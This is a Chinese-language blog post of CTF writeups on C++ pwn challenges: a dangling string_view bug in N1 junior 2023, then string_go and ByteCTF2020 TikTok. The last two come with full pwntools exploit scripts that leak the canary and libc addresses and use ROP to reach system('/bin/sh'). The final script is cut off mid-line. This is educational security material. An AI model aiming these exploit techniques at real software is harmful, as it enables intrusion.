    <content type="html"><![CDATA[<h1 id="learn-to-do-C-Pwn"><a href="#learn-to-do-C-Pwn" class="headerlink" title="learn to do C++ Pwn"></a>learn to do C++ Pwn</h1><h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>借用前华东百之👴的一句话：</p><p>c++pwn，就是艹c艹</p><h1 id="0x1-愉悦的折磨"><a href="#0x1-愉悦的折磨" class="headerlink" title="0x1:愉悦的折磨"></a>0x1:愉悦的折磨</h1><h2 id="N1-junior2023-顶级签到"><a href="#N1-junior2023-顶级签到" class="headerlink" title="N1 junior2023 顶级签到"></a>N1 junior2023 顶级签到</h2><p>当初笔者参加N1 junior，这题是看都看不懂，在学了两天C++基本语法后，笔者重新捡起了这题</p><p>题目给了源码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">(写完程序)</span><br><span class="hljs-comment">“你自己运行了吗？😏”</span><br><span class="hljs-comment">“跑了一下🤥”</span><br><span class="hljs-comment">“感觉怎么样？🧐”</span><br><span class="hljs-comment">“我去除了大部分的安全问题，但是我保留了一部分” “我觉得保留了一部分漏洞，才知道你做的是CTF题🤓”</span><br><span class="hljs-comment">“你是有意把它保留的吗🤨”</span><br><span class="hljs-comment">“是编写过程中，我留下了一部分😌”</span><br><span class="hljs-comment">“是故意的还是不小心😨”</span><br><span class="hljs-comment">“是故意的😋”</span><br><span class="hljs-comment">（打开源码）</span><br><span class="hljs-comment">“🍴😵‍💫🥴😤😡🤬”</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;exception&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string_view&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-function">string <span class="hljs-title">getInput</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string res;<br>    <span class="hljs-built_in">getline</span>(cin, res);<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">64</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">runtime_error</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>    <span class="hljs-keyword">while</span> (!res.<span class="hljs-built_in">empty</span>() &amp;&amp; res.<span class="hljs-built_in">back</span>() == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        res.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-type">bool</span> allow_admin = <span class="hljs-literal">false</span>;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">splitToken</span><span class="hljs-params">(string_view str, string_view delim)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!allow_admin &amp;&amp; str.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;admin&quot;</span>) != str.npos)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Access denied&quot;</span>);<br>    vector&lt;string_view&gt; res;<br>    <span class="hljs-type">size_t</span> prev = <span class="hljs-number">0</span>, pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        pos = str.<span class="hljs-built_in">find</span>(delim, prev);<br>        <span class="hljs-keyword">if</span> (pos == std::string::npos)<br>        &#123;<br>            pos = str.<span class="hljs-built_in">length</span>();<br>        &#125;<br>        res.<span class="hljs-built_in">push_back</span>(str.<span class="hljs-built_in">substr</span>(prev, pos - prev));<br>        prev = pos + delim.<span class="hljs-built_in">length</span>();<br>    &#125; <span class="hljs-keyword">while</span> (pos &lt; str.<span class="hljs-built_in">length</span>() &amp;&amp; prev &lt; str.<span class="hljs-built_in">length</span>());<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">parseUser</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> tok_ring = <span class="hljs-built_in">splitToken</span>(<span class="hljs-built_in">getInput</span>(), <span class="hljs-string">&quot;:&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring.<span class="hljs-built_in">size</span>() != <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login token&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &lt; <span class="hljs-number">4</span> || tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login name&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">1</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">32</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login password&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(tok_ring[<span class="hljs-number">0</span>], tok_ring[<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-type">const</span> unordered_map&lt;string_view, function&lt;<span class="hljs-type">void</span>(string_view)&gt;&gt; handle_admin = &#123;<br>    &#123;<span class="hljs-string">&quot;admin&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/readflag&quot;</span>);<br>     &#125;&#125;,<br>    &#123;<span class="hljs-string">&quot;?&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         cout &lt;&lt; <span class="hljs-string">&quot;Enjoy :)&quot;</span> &lt;&lt; endl;<br>         cout &lt;&lt; <span class="hljs-string">&quot;https://www.bilibili.com/video/BV1Nx411S7VG&quot;</span> &lt;&lt; endl;<br>     &#125;&#125;&#125;;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> handle_guest = [](<span class="hljs-keyword">auto</span>)<br>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Hello guest!&quot;</span> &lt;&lt; endl;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> [username, password] = <span class="hljs-built_in">parseUser</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter &#x27;login&#x27; to continue, or enter &#x27;quit&#x27; to cancel.&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">auto</span> choice = <span class="hljs-built_in">getInput</span>();<br>    <span class="hljs-keyword">if</span> (choice == <span class="hljs-string">&quot;quit&quot;</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;bye&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> it = handle_admin.<span class="hljs-built_in">find</span>(username); it != handle_admin.<span class="hljs-built_in">end</span>())<br>    &#123;<br>        it-&gt;<span class="hljs-built_in">second</span>(password);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">handle_guest</span>(password);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>怎么说呢，👴只能看出个大概运行逻辑，但👴是真的找不到洞</p><p>👴只能求助👴高中的OI👴（国一👴！！）</p><p><img src="/img/C++/0.png" alt="img"></p><p>问题出现在 <code>main</code> 函数中。一旦 <code>parseUser</code> 返回，<code>splitToken</code> 函数中创建的字符串就超出了它们的作用域，因为这些字符串是局部变量。因此，<code>username</code> 和 <code>password</code> 变量成为了悬垂指针（Dangling Pointers），它们引用的内存已经无效。</p><p>所以第二次输入到choice变量的时候，就可以复用这个悬垂指针，看似指向username 和 password，实则里面的内容已经是choice，所以输入choice的时候输入”admin”就行了。，</p><p>👴以为👴又行了，结果试了一下发现八行。👴很恼火，就去摸鱼了，摸着摸着就摸到了纯真✌的博客（<a href="https://zqy.ink/2023/05/12/dingjiqiandao/">@张清越</a>），了解了SSO机制对于不同长度的字符串的处理。</p><p>同时string_view会记录字符串的size，因为admin的size是5，所以第一次login的时候username的size也应该是5.</p><p>👴又自己写了一个poc，应该更好理解一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;iostream&gt;</span><br><span class="hljs-comment">#include &lt;string_view&gt;</span><br><span class="hljs-comment">#include &lt;cstring&gt;</span><br><span class="hljs-comment">#include &lt;vector&gt;</span><br><br>std::string_view CreateAndReturnPointer() &#123;<br><br>   std::string res;<br>   getline(std::cin,res);<br>   std::string_view strView(res);<br><br>   <span class="hljs-keyword">return</span> strView;<br>&#125;<br><br><span class="hljs-built_in">int</span> main() &#123;<br><br>   std::string_view view = CreateAndReturnPointer();<br>   <br>   std::string res;<br>   getline(std::cin,res);<br><br>   std::cout &lt;&lt; <span class="hljs-string">&quot;now the content of string_view is :&quot;</span> &lt;&lt; view.substr(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>) &lt;&lt; std::endl;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>按理来说，view指向的字符串应该是b’a’*0x80</p><p>但是刚出CreateAndReturnPointer函数，储存字符串的chunk就被free了</p><p><img src="/img/C++/1.png" alt="img"></p><p>所以后面的getline获取输入的时候，一但输入size和第一次输入size相等，这个chunk又会被启用，但是，其中的内容已经变了，而view并不知道家被偷了。</p><p>所以最后的结果便是</p><p><img src="/img/C++/2.png" alt="img"></p><p>噫，👴终于懂了。</p><h2 id="西湖论剑2021-string-go"><a href="#西湖论剑2021-string-go" class="headerlink" title="西湖论剑2021 string_go"></a>西湖论剑2021 string_go</h2><p>👴在翻库存的时候发现了一道21年的西葫芦🗡的C++</p><p>就拿过来练练手</p><p>程序本身实现了一个只能进行加减运算的clac，当计算结果为3时可以进入lative_func</p><p><img src="/img/C++/3.png" alt="img"></p><p>后面经过动调发现,字符串-8的地方存放的是输出时的size，同时idx可以为负数，那就能把size给改了，泄露出栈上的数据后用memcpy完成栈溢出。</p><p><img src="/img/C++/4.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./string_go&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./string_go&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x23A9)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>rc(<span class="hljs-number">0x18</span>)<br>data1 = rc(<span class="hljs-number">0x18</span>)<br>canary = u64(rc(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br><br>rc(<span class="hljs-number">8</span>)<br>elf_base = u64(rc(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1760</span><br>leak(<span class="hljs-string">&quot;elf_base&quot;</span>,elf_base)<br><br>pop_rdi = <span class="hljs-number">0x0000000000003cf3</span> + elf_base<br>main = elf_base + <span class="hljs-number">0x24bd</span><br><br>data2 = rc(<span class="hljs-number">0x18</span>)<br>p.recv()<br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]+elf_base) + p64(main)<br>sl(payload)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;-7&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000014ce</span>)+ p64(pop_rdi)+ p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ByteCTF2020-TikTok"><a href="#ByteCTF2020-TikTok" class="headerlink" title="ByteCTF2020 TikTok"></a>ByteCTF2020 TikTok</h2><p>在A3👴博客中找到的题，C++逆向就是出生的太阳，逼样的晚意。</p><p>题目一打开，楽，真会整活</p><p><img src="/img/C++/5.png" alt="img"></p><p>功能多的一批，于是👴就勤勤肯肯把所有功能都写了，结果👴在delete，输入密码的时候，发现密码输入错误直接把栈里面的数据带出来了，👴就知道这把有了。因为delete这个功能有几个花指令，不能傻瓜create function，看不了伪代码。于是👴进gdb看到了memcpy，甚至输入错位还有输出，人还怪好的。那就是泄露数据后栈溢出，和前一题一样的套路。</p><p>（所以这么多fuction你是一点没用啊）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./tiktok&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./tiktok&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;$ &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">password</span>):<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,password)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">sex,<span class="hljs-built_in">type</span>,age,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Add &#x27;</span><br>    payload += sex + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">type</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">str</span>(age).encode() + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">sex</span>):<br>    payload = <span class="hljs-string">b&#x27;Show&#x27;</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += sex<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Info &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Delete &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Convert &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Edit &#x27;</span><br>    payload += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">follow</span>(<span class="hljs-params">action,id1,id2</span>):<br>    payload = <span class="hljs-string">b&#x27;Follow &#x27;</span><br>    payload += action + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id1 + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id2 + <span class="hljs-string">b&#x27; &#x27;</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    paylaod = <span class="hljs-string">b&#x27;Clone &#x27;</span><br>    paylaod += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    paylaod += name<br>    sla(menu,paylaod)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>canary = u64(rc(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary))<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value1 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value1&quot;</span>,stack_value1)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1))<br><br>delete(<span 